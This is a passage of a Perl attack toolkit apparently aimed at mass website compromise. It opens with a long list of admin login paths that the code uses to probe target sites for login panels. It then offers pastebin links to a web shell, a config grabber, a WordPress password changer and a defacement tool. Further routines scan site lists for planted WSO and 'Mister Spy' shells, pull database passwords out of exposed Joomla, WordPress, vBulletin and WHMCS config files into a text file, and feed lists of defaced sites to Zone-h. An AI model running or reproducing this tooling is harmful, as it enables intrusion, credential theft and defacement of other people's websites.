php','bb-admin/login.php','bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html','admin/controlpanel.php','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html','webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html','admin/cp.php','cp.php','administrator/index.php','administrator/login.php','nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php','administrator/account.php','administrator.php','admin_area/admin.html','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php','bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','modelsearch/login.php','moderator.php','moderator/login.php','moderator/admin.php','account.php','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php','admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.php','adminarea/index.html','adminarea/admin.html','webadmin.php','webadmin/index.php','webadmin/admin.php','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html','administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html','panel-administracion/login.php','wp-login.php','adminLogin.php','admin/adminLogin.php','home.php','adminarea/index.php','adminarea/admin.php','adminarea/login.php','panel-administracion/index.php','panel-administracion/admin.php','modelsearch/index.php','modelsearch/admin.php','admincontrol/login.php','adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php','adm/index.php','adm.php','affiliate.php','adm_auth.php','admin','admin.asp','admin.aspx','admin.cfm','admin.html','admin.php','admin.xhtml','admin/','wp-admin','wp-admin/','wp-login.php','wp-login/','admin/account.asp','admin/account.cfm','admin/account.html','admin/account.php','admin/admin.asp','admin/admin.cfm','admin/admin.html','admin/admin.php','admin/admin_login.asp','admin/admin_login.cfm','admin/admin_login.html','admin/admin_login.php','admin/admin-login.asp','admin/adminLogin.asp','admin/admin-login.cfm','admin/adminLogin.cfm','admin/admin-login.html','admin/adminLogin.html','admin/admin-login.php','admin/adminLogin.php','admin/controlpanel.asp','admin/controlpanel.cfm','admin/controlpanel.html','admin/controlpanel.php','admin/cp.asp','admin/cp.cfm','admin/cp.html','admin/cp.php','admin/home.asp','admin/home.cfm','admin/home.html','admin/home.php','admin/index.asp','admin/index.cfm','admin/index.html','admin/index.php','admin/login.asp','admin/login.cfm','admin/login.html','admin/login.php','account.asp','account.cfm','account.html','account.php','acct_login/','adm','adm.asp','adm.cfm','adm.html','adm.php','adm/','adm/admloginuser.asp','adm/admloginuser.cfm','adm/admloginuser.php','adm/index.asp','adm/index.cfm','adm/index.html','adm/index.php','adm_auth.asp','adm_auth.cfm','adm_auth.php','admin_area','admin_area/','admin_area/admin.asp','admin_area/admin.cfm','admin_area/admin.html','admin_area/admin.php','admin_area/index.asp','admin_area/index.cfm','admin_area/index.html','admin_area/index.php','admin_area/login.asp','admin_area/login.cfm','admin_area/login.html','admin_area/login.php','admin_login.asp','admin_login.cfm','admin_login.html','admin_login.php','admin1.asp','admin1.html','admin1.php','admin1/','admin2.asp','admin2.cfm','admin2.html','admin2.php','admin2/index.asp','admin2/index.cfm','admin2/index.php','admin2/login.asp','admin2/login.cfm','admin2/login.php','admin4_account/','admin4_colon/','adminarea','adminarea/admin.asp','adminarea/admin.cfm','adminarea/admin.html','adminarea/admin.php','adminarea/index.asp','adminarea/index.cfm','adminarea/index.html','adminarea/index.php','adminarea/login.asp','adminarea/login.cfm','adminarea/login.html','adminarea/login.php','admincontrol.asp','admincontrol.cfm','admincontrol.html','admincontrol.php','admincontrol/login.asp','admincontrol/login.cfm','admincontrol/login.html','admincontrol/login.php','admincp/index.asp','admincp/index.cfm','admincp/index.html','admincp/login.asp','admincp/login.cfm','administer/','administr8.asp','administr8.html','administr8.php','administr8/','administratie/','administration.html','administration.php','administration/','administrator','administrator.asp','administrator.cfm','administrator.html','administrator.php','administrator/','administrator/account.asp','administrator/account.cfm','administrator/account.html','administrator/account.php','administrator/index.asp','administrator/index.cfm','administrator/index.html','administrator/index.php','administrator/login.asp','administrator/login.cfm','administrator/login.html','administrator/login.php','administratoraccounts/','administratorlogin','administratorlogin.asp','administratorlogin.cfm','administratorlogin.php','administrators/','administrivia/','adminLogin','admin-login.asp','adminLogin.asp','admin-login.cfm','adminLogin.cfm','admin-login.html','adminLogin.html','admin-login.php','adminLogin.php','adminpanel.asp','adminpanel.cfm','adminpanel.html','adminpanel.php','adminpro/','admins.asp','admins.html','admins.php','admins/','AdminTools/','admloginuser.asp','admloginuser.cfm','admloginuser.php','affiliate.asp','affiliate.cfm','affiliate.php','autologin/','banneradmin/','bb-admin','bbadmin/','bb-admin/admin.asp','bb-admin/admin.cfm','bb-admin/admin.html','bb-admin/admin.php','bb-admin/index.asp','bb-admin/index.cfm','bb-admin/index.html','bb-admin/index.php','bb-admin/login.asp','bb-admin/login.cfm','bb-admin/login.html','bb-admin/login.php','bigadmin/','blogindex/','cadmins/','ccp14admin/','Clave/','cmsadmin/','controlpanel.asp','controlpanel.cfm','controlpanel.html','controlpanel.php','controlpanel/','cp.asp','cp.cfm','cp.html','cp.php','cpanel/','cPanel/','cpanel_file/','customer_login/','database_administration/','Database_Administration/','directadmin/','dir-login/','ezsqliteadmin/','fileadmin.asp','fileadmin.html','fileadmin.php','fileadmin/','formslogin/','globes_admin/','home.asp','home.cfm','home.html','home.php','
        hpwebjetadmin/','Indy_admin/','instadmin','irc-macadmin/','LiveUser_Admin/','login.asp','login.cfm','login.html','login.php','login_db/','login1/','loginflat/','login-redirect/','login-us/','logo_sysadmin/','Lotus_Domino_Admin/','macadmin/','manage','manuallogin/','memberadmin','memberadmin.asp','memberadmin.cfm','memberadmin.php','members/','memlogin/','meta_login/','modelsearch/admin.asp','modelsearch/admin.cfm','modelsearch/admin.html','modelsearch/admin.php','modelsearch/index.asp','modelsearch/index.cfm','modelsearch/index.html','modelsearch/index.php','modelsearch/login.asp','modelsearch/login.cfm','modelsearch/login.html','modelsearch/login.php','moderator','moderator.asp','moderator.cfm','moderator.html','moderator.php','moderator/','moderator/admin.asp','moderator/admin.cfm','moderator/admin.html','moderator/admin.php','moderator/login.asp','moderator/login.cfm','moderator/login.html','moderator/login.php','myadmin/','navSiteAdmin/','newsadmin/','nsw/admin/login.php','openvpnadmin/','P/W/','pages/admin/admin-login.asp','pages/admin/admin-login.cfm','pages/admin/admin-login.html','pages/admin/admin-login.php','panel/','panel-administracion','panel-administracion/admin.asp','panel-administracion/admin.cfm','panel-administracion/admin.html','panel-administracion/admin.php','panel-administracion/index.asp','panel-administracion/index.cfm','panel-administracion/index.html','panel-administracion/index.php','panel-administracion/login.asp','panel-administracion/login.cfm','panel-administracion/login.html','panel-administracion/login.php','passe/','password/','Password/','PASSWORD/','Personal/','pgadmin/','phpldapadmin/','phpmyadmin/','phppgadmin/','phpSQLiteAdmin/','platz_login/','power_user/','project-admins/','pureadmin/','radmind/','radmind-1/','rcjakar/admin/login.php','rcLogin/','senha/','Senha/','Server.asp','Server.html','Server.php','server/','Server/','server_admin_small/','ServerAdministrator/','showlogin/','simpleLogin/','Sing/','siteadmin/index.asp','siteadmin/index.cfm','siteadmin/index.php','siteadmin/login.asp','siteadmin/login.cfm','siteadmin/login.html','siteadmin/login.php','smblogin/','sql-admin/','ss_vms_admin_sm/','sshadmin/','staradmin/','sub-login/','Super-Admin/','support_login/','sysadmin.asp','sysadmin.html','sysadmin.php','sysadmin/','sys-admin/','SysAdmin/','SysAdmin2/','sysadmins/','system_administration/','system-administration/','typo3/','ur-admin.asp','ur-admin.html','ur-admin.php','ur-admin/','usager/','Usager/','user.asp','user.cfm','user.html','user.php','useradmin/','UserLogin/','username/','Username/','USERNAME/','Usuario/','utility_login/','vadmind/','vmailadmin/','webadmin','webadmin.asp','webadmin.cfm','webadmin.html','webadmin.php','webadmin/','WebAdmin/','webadmin/admin.asp','webadmin/admin.cfm','webadmin/admin.html','webadmin/admin.php','webadmin/index.asp','webadmin/index.cfm','webadmin/index.html','webadmin/index.php','webadmin/login.asp','webadmin/login.cfm','webadmin/login.html','webadmin/login.php','wizmysqladmin/','wp-admin','wp-admin/','wp-login.php','wp-login/','xlogin/','yonetici.asp','yonetici.html','yonetici.php','yonetim.asp','yonetim.html','yonetim.php','ser.asp','panel.asp','admin/login.htm','administratorlogin.php','cp.asp','admin.php','administrators.php','relogin.htm','log-in.asp','controlpanel.asp','controlpanel/','vadmind/','log-in.php','authadmin.php','xlogin/','server_admin_small/','admincp/login.php','adm_auth.asp','checkadmin.asp','adminpro/','loginflat/','bb-admin/login.asp','news_detail.php','Indy_admin/','adminitem.asp','vorod.php','moderator/login.asp','login1/','irc-macadmin/','superuser.php','pureadmin/','formslogin/','adminitems/','sysadm/','0manager/','Server/','phpldapadmin/','myadmin/','yonetim.html','adminLogin/','vorod/','sysadm.asp','administrator/','loginok/','root/','yonetim.php','loginphp','index.swf','loginsave/','admin1.htm','dir-login/','wp-login.php','superuserasp','moderator/admin.asp','adminsite/','logoutasp','access/','cpanel_file/','sysadmins/','moderator.php','relogin.php','users/','smblogin/','navSiteAdmin/','isadmin.php','sign-in.php','memlogin/','phppgadmin/','management.asp','js/jquery-1.4.2.js','7','http://www.mirandam.com/panel/about_edit.php','instadmin/','bb-admin/admin.html','0admin/','affiliate.php','meta_login/','signin.php','superuser.asp','loginsuper/','vorod.asp','aadmin/','ur-admin.php','yonetici.asp','admin/controlpanel.asp','administr8.asp','signin.asp','administration/','admin2.asp','blogindex/','ur-admin/','admincontrol.php','cgi-bin/loginasp','js/%20id=','cgi-bin/loginphp','adm.php','admin_login.asp','administration.php','login-us/','supermanagerasp','moderator/admin.php','admin/account.php','Server.asp','useradmin/','adminlogin.php','bigadmin/','moderator.asp','login_adminasp','authentication.asp','power_user/','modules/admin/','admin1.asp','platz_login/','manager/','logout/','manage/','admin/admin.asp','moderator/login.php','pages/admin/admin-login.php','fileadmin.asp','wp-admin/','logo_sysadmin/','admin/adminLogin.htm','bb-admin/admin.asp','pages/admin/','processlogin.php','loginsuperphp','super1php','uvpanel/','macadmin/','system_administration/','admin/cp.php','admin4_account/','sysadmin.php','control.php','supermanphp','super_indexasp','admin/adminLogin.php','panel-administracion/login.php','admin/account.html','admins.php','log_in.php','admins.asp','radmind-1/','sysadm.php','staradmin/','login_db/','userlogin.php','secrets/','accounts.php','security/','login/','manage.php','panel/js/jquery.maskedinput.js','login_userasp','vmailadmin/','globes_admin/','fileadmin/','login_outphp','admin4_colon/','superphp','admin/','vorud.asp','admin_login.php','manager.php','admin/account.asp','admin_area.asp','admin.html','usr/','administr8.php','SysAdmin2/','adminitem.php','login.php','management/','project-admins/','typo3/','admin.htm','admin/home.asp','vorud.php','admins/','accounts/','super_loginphp','super_indexphp','adminpanel.php','memberadmin/','access.asp','superuserphp','system-administration/','pages/admin/admin-login.asp','panel-administracion/login.asp','sign_in.php','super_loginasp','moderator.html','log_in/','autologin.php','ysadmin.asp','supermanasp','adminitems.php','admin/cp.asp','acceso.php','login-redirect/','auth.php','login.asp','Database_Administration/','webadmin.asp','modelsearch/login.asp','cmsadmin/','admincp/login.asp','phpSQLiteAdmin/','login_admin/','ServerAdministrator/','admin-login.asp','letmein.asp','member/','acct_login/','loginsuperasp','manage.asp','sign_in/','LiveUser_Admin/','administratoraccounts/','utility_login/','administrator.php','js/url.slice(0,off)','secure/','administrator/login.asp','checklogin.asp','admin_area/login.php','authentication.php','UserLogin/','webadmin/','rcLogin/','sub-login/','authenticate.asp','login.html','admin/admin-login.php','ss_vms_admin_sm/','SysAdmin/','secret/','login1php','fileadmin.php','controlpanel.php','members.asp','login1asp','irectadmin/','adminlogin.asp','affiliate.asp','admin/home.php','admin.asp','superuser/','Server.php','cpanel/','cp.php','customer_login/','access.php','administratie/','control.asp','autologin/','wp-login/','administrator/login.php','admin/admin-login.asp','openvpnadmin/','FCKeditor/editor/images/anchor.gif','checklogin.php','admin1.html','siteadmin.php','yonetim.asp','supervise/Loginasp','adminitem/','admin/controlpanel.php','authuser.php','modelsearch/login.php','ur-admin.asp','showlogin/','webmaster.php','letmein.php','admin-login.php','sign_in.asp','sshadmin/','loginasp','checkadmin.php','letmein/','panel.php','simpleLogin/','control/','log-in/','moderator/','admin/login.asp','members/','admin_area.php','logoutphp','administrator/account.php','bb-admin/','administr8/','relogin.asp','cmsadmin.asp','member.php','admin/adminLogin.html','adminpanel/','supermanagerphp','panel-administracion/','relogin.html','sign-in.asp','adm_auth.php','ezsqliteadmin/','adm.asp','member.asp','admin1.php','radmind/','login_outasp','admin2.php','admin_area/','sql-admin/','administratorlogin/','admin/login.php','admin/controlpanel.htm','processlogin.asp','administrators.asp','admincp/','Super-Admin/','kpanel/','log_in.asp','webadmin.php','accounts.asp','checkuser.php','ccp14admin/','newsadmin/','check.asp','manuallogin/','phpmyadmin/','administrators/','autologin.asp','checkuser.asp','acceso.asp','adminitems.asp','auth.asp','superasp','login_userphp','PSUser/','siteadmin.asp','admin_area/login.asp','wizmysqladmin/','memberadmin.php','userlogin.asp','siteadmin/','adminarea/','adm/','users.php','supervise/Loginphp','manager.asp','users.asp','login.htm','cmsadmin.php','administration.asp','signin/','admin_area/admin.php','admincontrol.asp','supervise/','adminpanel.asp','super1asp','login_adminphp','webmaster/','sign-in/','bbadmin/','authadmin.asp','admin/adminLogin.asp','hpwebjetadmin/','super1/','support_login/','login_out/','yonetici.html','administratorlogin.asp','bb-admin/login.php','management.php','administer/','yonetici.php','sys-admin/','Lotus_Domino_Admin/','members.php','administrivia/','authenticate.php','banneradmin/','user/','AdminTools/','admin/controlpanel.html','webmaster.asp','administrator.asp','authuser.asp','cadmins/','superman/','admincontrol/','bb-admin/admin.php','supervisor/','pgadmin/','loginerror/','admin/admin_login.php','isadmin.asp','check.php','admin/admin_login.asp','admin_area/admin.aspuser.php','admin/admin.php','admin/login.html','admin2.html','admin1/','vorud/','memberadmin.asp','administrator/account.asp'
        );

        foreach $ways(@path2){

        $final=$site.$ways;

        my $req=HTTP::Request->new(GET=>$final);
        my $ua=LWP::UserAgent->new();
        $ua->timeout(30);
        my $response=$ua->request($req);

        if($response->content =~ /Username/ ||
        $response->content =~ /Password/ ||
        $response->content =~ /username/ ||
        $response->content =~ /password/ ||
        $response->content =~ /USERNAME/ ||
        $response->content =~ /PASSWORD/ ||
        $response->content =~ /Username/ ||
        $response->content =~ /Wachtwoord/ ||
        $response->content =~ /Senha/ ||
        $response->content =~ /senha/ ||
        $response->content =~ /Personal/ ||
        $response->content =~ /Usuario/ ||
        $response->content =~ /Clave/ ||
        $response->content =~ /Usager/ ||
        $response->content =~ /usager/ ||
        $response->content =~ /Sing/ ||
        $response->content =~ /passe/ ||
        $response->content =~ /P\/W/ || 
        $response->content =~ /Admin Password/
        ){
        print " \n [+] Found -> $final\n\n";

        if ($save eq "y"){
        print "Save stored\n";
        open (MYFILE, '>>med.txt');
        print MYFILE " \n $final\n";
        close (MYFILE); 
        }
        if ($save eq "n"){
        print "Save NOT stored\n"; }
        }else{
        print "[-] Not Found <- $final\n";
        }
        }
        }
}


sub toolzi(){
$DELAY = ($ARGV[0] =~ /^-([.\d]+)/) ? (shift, $1) : 1;
$| = 1;
$_ ="Tools You want To Download
1-Shell Bypass Mister SPy v1\n2-Wordpress Pass Change\n3-Config Grabber\n4-Deface Wp from Config\n5-Mailer Script By Mr Spy\n";
while ($_) {
    for (split(//)) {
            print;
                    select(undef,undef,undef, 0.005 * 20);
                      }
        $_ = "";
           }
print "List : \n";
$tazzzx=<STDIN>;

if($tazzzx eq '1')
{
print"https://pastebin.com/raw/aKQDB9JK";
}
if($tazzzx eq '2')
{
print"https://pastebin.com/raw/CbxJi6V3";

}if($tazzzx eq '3')
{
print"https://pastebin.com/raw/aKQDB9JK";

}
if($tazzzx eq '4')
{
print"https://pastebin.com/raw/w8tYAQyb
";

}
if($tazzzx eq '5')
{
print"https://pastebin.com/raw/4KZCTZ0L
";

}
}

sub zonehposter(){

sub dumperpassx(){
passdumper();
sub passdumper(){
print "Config Links File.txt  : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site/"; };
tazpassdumper();


}
}
sub checkwpspy(){
print "List : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site/"; };
checkwpspyx();
}
sub checkwpspyx(){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);
print"[checking] $site";
#/wp-admin/setup-config.php
#/wordpress/wp-admin/setup-config.php
#/wp-admin/setup-config.php


my $spyxy = $ua->get("$site")->content;

if($spyxy =~/Mister Spy/) {

    print color('bold green');
	    print  "[Found] ==> $site \n";

    open(save, '>>workshells.txt');
    print save "[Found] ==> $site \n";
    close(save);
    print color('reset');

}
    elsif ($spyxy =~/WSO 2.6/){
    print color('bold green');
	    print  "[Found] ==> $site\n";

	    open(save, '>>workshells.txt');
    print save "[Found] ==> $site \n";
    close(save);
    print color('reset');

    } elsif ($spyxy =~/Uname:/){
    print color('bold green');
	    print  "[Found] ==> $site \n";

	    open(save, '>>workshells.txt');
    print save "[Found] ==> $site \n";
    close(save);
    print color('reset');

    }
else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');


        }
		}
	}
	


sub tazpassdumper(){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (15);
my $cont = $ua->get("$site")->content;

# // Fuck Off kids  Spy always a geniuses   //


  print color('reset');

        if ($cont =~ /password = \'(.*?)\';/){ #jm
		print color('bold green');
        print "\t Pass = $1 -Joomla \n";
	    print color('reset');
        open (TEXT, '>>passworddumped.txt');
        print TEXT "$1\n";
        close (TEXT);
  } elsif ($cont =~ /'DB_PASSWORD\', \'(.*)\'/){ #wordpress
  	    print color('bold red');
        print "\t Pass = $1  - wordpress\n";
	    print color('reset');
        open (TEXT, '>>passworddumped.txt');
        print TEXT "$1\n";
        close (TEXT);
  } elsif ($cont =~ /password_localhost = "(.*)"/){ #conexao.php
        print "\t Pass = $1 \n";
        open (TEXT, '>>passworddumped.txt');
        print TEXT "$1\n";
        close (TEXT);
  }elsif ($cont =~ /password\'] = \'(.*)/){ #vb
        print "\t Pass = $1 \n";
        open (TEXT, '>>passworddumped.txt');
        print TEXT "$1\n";
        close (TEXT);
  }elsif ($cont =~ /db_password = "(.*)"/){ #whmcs
        print "\t Pass = $1 \n";
        open (TEXT, '>>passworddumped.txt');
        print TEXT "$1\n";
        close (TEXT);
  }elsif ($cont =~ /db_pwd =  "(.*)"/){
        print "\t Pass = $1 \n";
        open (TEXT, '>>passworddumped.txt');
        print TEXT "$1\n";
        close (TEXT);
  }elsif ($cont =~ /config\[\'db_pass\'\] = \'(.*)\'/){
        print "\t Pass = $1 \n";
        open (TEXT, '>>passworddumped.txt');
        print TEXT "$1\n";
        close (TEXT);
  }
  
else{
print "No Password Found maybe The Config 404 :(";
print "\n";

    }

}
}

print "List of Sites You Want to Post In Zone-h : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$def = $_;
zoneh();
}
}